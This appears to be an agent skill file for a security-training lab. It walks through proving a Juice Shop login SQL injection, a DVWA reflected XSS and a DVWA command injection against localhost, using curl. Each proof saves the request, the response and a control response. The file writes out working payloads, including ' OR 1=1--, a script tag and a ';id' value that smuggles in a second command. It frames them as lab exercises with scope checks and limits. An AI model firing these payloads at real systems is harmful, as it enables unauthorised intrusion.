---
name: training-flaws
description: Prove three textbook web flaws on the local training lab with one curl request each - Juice Shop login SQL injection, DVWA reflected XSS, DVWA command injection - and save request and response. Use when asked to demonstrate, prove or walk through SQLi, XSS or command injection on Juice Shop or DVWA.
---

# Training flaws: one request, one proof

Every proof has three files in `evidence/artifacts/`: the request, the
response, and a control response (same request, harmless value). The
difference between control and proof is the evidence.

```bash
mkdir -p evidence/artifacts
A=evidence/artifacts
JS=http://localhost:3000
DVWA=http://localhost:8081
# Mask JWTs and PHP session ids before anything is written to disk.
mask() { sed -E 's/eyJ[A-Za-z0-9._-]{20,}/eyJ0****/g; s/(PHPSESSID=[A-Za-z0-9]{4})[A-Za-z0-9]+/\1****/g'; }
```

## 1. LAB-001: Juice Shop login SQL injection

The login query is built from the `email` field. A quote closes the string
and `OR 1=1--` makes the condition true for the first user.

```bash
printf '%s' '{"email":"nobody@lab.test","password":"x"}' > /tmp/control.json
printf '%s' '{"email":"'"'"' OR 1=1--","password":"x"}' > /tmp/sqli.json

curl -sS -i -X POST "$JS/rest/user/login" -H 'Content-Type: application/json' \
  --data @/tmp/control.json | mask > "$A/LAB-001-control-response.txt"

{ echo "POST $JS/rest/user/login"; echo 'Content-Type: application/json'; echo; cat /tmp/sqli.json; echo; } \
  > "$A/LAB-001-request.txt"
curl -sS -i -X POST "$JS/rest/user/login" -H 'Content-Type: application/json' \
  --data @/tmp/sqli.json | mask > "$A/LAB-001-response.txt"
```

Proven when the control answers `401` and the payload answers `200` with an
`authentication` object naming an existing account (`umail`). Stop here: do
not use the token.

## 2. Log in to DVWA

DVWA needs a session and its database. Both forms carry a `user_token`.

```bash
jar="$(mktemp)"
tok() { curl -sS -b "$jar" -c "$jar" "$DVWA/$1" | grep -oE "name='user_token' value='[a-f0-9]+'" | head -n 1 | cut -d"'" -f4; }

# Create the database (idempotent).
t="$(tok setup.php)"
curl -sS -o /dev/null -b "$jar" -c "$jar" --data-urlencode 'create_db=Create / Reset Database' \
  --data-urlencode "user_token=$t" "$DVWA/setup.php"

# Log in with the default lab account documented by DVWA (admin / password).
t="$(tok login.php)"
curl -sS -o /dev/null -w '%{http_code} %{redirect_url}\n' -b "$jar" -c "$jar" \
  --data-urlencode 'username=admin' --data-urlencode 'password=password' \
  --data-urlencode 'Login=Login' --data-urlencode "user_token=$t" "$DVWA/login.php"
# expected: 302 .../index.php

# The compose file sets the default level to low. Check it.
curl -sS -b "$jar" "$DVWA/security.php" | grep -io 'currently: <em>[a-z]*'
```

If the level is not `low`, set it once:

```bash
t="$(tok security.php)"
curl -sS -o /dev/null -b "$jar" -c "$jar" --data-urlencode 'security=low' \
  --data-urlencode 'seclev_submit=Submit' --data-urlencode "user_token=$t" "$DVWA/security.php"
```

## 3. LAB-002: DVWA reflected XSS

```bash
curl -sS -i -b "$jar" -G --data-urlencode 'name=labtest' \
  "$DVWA/vulnerabilities/xss_r/" | mask > "$A/LAB-002-control-response.txt"

payload='<script>alert(document.domain)</script>'
{ echo "GET $DVWA/vulnerabilities/xss_r/?name=$payload"; echo 'Cookie: PHPSESSID=(lab session); security=low'; } \
  > "$A/LAB-002-request.txt"
curl -sS -i -b "$jar" -G --data-urlencode "name=$payload" \
  "$DVWA/vulnerabilities/xss_r/" | mask > "$A/LAB-002-response.txt"
grep -c "<pre>Hello $payload</pre>" "$A/LAB-002-response.txt"
```

Proven when the response body contains the `<script>` tag unencoded inside
`<pre>Hello ...</pre>` and the content type is `text/html`. An encoded
reflection (`&lt;script&gt;`) is not a finding.

## 4. LAB-003: DVWA command injection

The page runs `ping` with the `ip` field. A `;` starts a second command.
`id` is the only command you inject.

```bash
curl -sS -i -b "$jar" --data-urlencode 'ip=127.0.0.1' --data-urlencode 'Submit=Submit' \
  "$DVWA/vulnerabilities/exec/" | mask > "$A/LAB-003-control-response.txt"

{ echo "POST $DVWA/vulnerabilities/exec/"; echo 'Cookie: PHPSESSID=(lab session); security=low'; echo; echo 'ip=127.0.0.1;id&Submit=Submit'; } \
  > "$A/LAB-003-request.txt"
curl -sS -i -b "$jar" --data-urlencode 'ip=127.0.0.1;id' --data-urlencode 'Submit=Submit' \
  "$DVWA/vulnerabilities/exec/" | mask > "$A/LAB-003-response.txt"
grep -oE 'uid=[0-9]+\([a-z-]+\) gid=[0-9]+\([a-z-]+\)' "$A/LAB-003-response.txt"
rm -f "$jar"
```

Proven when the response shows the `id` output (`uid=33(www-data)` on the
stock image) and the control does not.

## 5. Juice Shop DOM XSS (hypothesis)

The search page writes the `q` fragment parameter into the DOM in the
browser (`http://localhost:3000/#/search?q=...`). The server never sees the
fragment, so `curl` cannot prove execution. Record a hypothesis with the URL
and the next step: load it in a headless browser and observe the injected
element.

## Triage questions

1. Does the control response differ from the proof in the way the flaw
   predicts (401 vs 200, encoded vs raw, no `uid=` vs `uid=`)?
2. Is the saved response complete enough for a reader to see it without
   re-running anything?
3. Is any token, cookie or password left in a saved file? Mask it.
4. Did the request go to a host in `.lab/scope.json`?

## Pitfalls

- Reporting XSS from the request alone. The response must contain the raw tag.
- Using the admin token from LAB-001 to browse the application. The proof
  ends at the login response.
- Injecting anything but `id` in LAB-003, or chaining more commands.
- Forgetting the DVWA setup step: every page then redirects to `setup.php`.
- Writing a wrong CVSS score. The gate recomputes it from the vector.
